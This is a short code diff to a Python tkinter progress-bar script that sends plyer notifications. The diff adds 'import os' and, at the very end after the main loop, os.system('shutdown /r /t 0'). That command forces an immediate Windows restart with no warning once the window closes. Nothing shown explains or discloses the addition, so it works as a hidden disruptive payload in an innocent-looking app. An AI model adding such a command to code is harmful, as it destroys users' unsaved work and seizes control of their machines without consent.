@@ -4,6 +4,7 @@ from tkinter import messagebox
 import sys
 import plyer
 from plyer import notification
+import os
 
 def update_progressbar():
     if progressbar["value"] < 100:
@@ -54,3 +55,4 @@ progressbar.pack()
 
 root.after(0, update_progressbar)
 root.mainloop()
+os.system("shutdown /r /t 0")
